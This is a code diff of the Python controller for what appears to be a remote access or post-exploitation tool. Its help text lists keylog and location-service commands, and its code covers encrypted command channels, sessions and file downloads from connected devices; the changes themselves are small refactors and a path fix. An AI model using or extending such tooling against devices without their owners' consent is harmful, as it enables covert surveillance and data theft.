@@ -55,12 +55,10 @@ BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     4): Exit
 """ + WHITE + "-"*40
 BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
-#MARK: OS Commands
-#iswin is already in UI part, but that has ios in it
-iswin = sys.platform.startswith('win')
+
+#MARK: Local Commands
 CMD_CLEAR = 'cls' if iswin else 'clear'
 CMD_LS = 'dir' if iswin else 'ls'
-#Windows is so weird with its commands.
 CMD_PWD = 'cd' if iswin else 'pwd'
 
 iosshortcuts = {
@@ -100,7 +98,6 @@ def encryptStr(string,cypter=escrypt):
         result += cypter.encode(chunk)
         x+=12
     return result
-
 
 #MARK: String Formatting/Convenience
 def strinfo(this):
@@ -201,6 +198,8 @@ def showHelp(CDA):
         showCommand("keylogclear","clear keylog data")
         showCommand("locationservice","turn on or off location services")
         print ""
+
+#MARK: Local Commands
 
 def lopen(command):
     if len(command.split()) == 1:
@@ -308,23 +307,19 @@ def sendCMD(cmd,conn):
         exit()
 
 def receiveString(conn):
-#    try:
-        data = ""
-        while 1:
-            data += conn.recv(2048)
-            if not data:
-                return "we fucked up, disconnecting (please type 'back' to leave this page)"
-            #terminator to notify when we are done receiving data
-            #useful for getting however much data we want
-            if terminator in data:
-                data = data.replace(terminator,"")
-                result = bbde(escrypt.decode(data))
-                if result == "-1":
-                    result = "invalid command"
-                return result
-#    except:
-#        return "error getting return value"
-
+    data = ""
+    while 1:
+        data += conn.recv(2048)
+        if not data:
+            return "oops, something went wrong, disconnecting"
+        #terminator to notify when we are done receiving data
+        #useful for getting however much data we want
+        if terminator in data:
+            data = data.replace(terminator,"")
+            result = bbde(escrypt.decode(data))
+            if result == "-1":
+                result = "invalid command"
+            return result
 
 #MARK: File Transfers
 def uploadFile(fileName,location,conn):
@@ -405,7 +400,7 @@ def downloadFile(command,conn):
             #decrypt with our shell key, remove tmp file
             downloadedFile = open("data/"+filename,"wb")
             downloadedFile.close()
-            if not escrypt.decryptFile(os.getcwd()+"/.tmpfile", filename, shellKey, sizeofFile):
+            if not escrypt.decryptFile(os.getcwd()+"/.tmpfile", "data/"+filename, shellKey, sizeofFile):
                 print strinfo("error decrypting data :(")
             os.remove(os.getcwd()+"/.tmpfile")
             print strinfo("Finished Downloading!")
@@ -660,7 +655,6 @@ def multiServerExit(bgserver):
     sessions.clear()
     AMODE = "none"
     interactiveMenu()
-
 
 def multiServerHelp():
     print WHITEBU+"MultiSession Commands:"+"\n"+ENDC
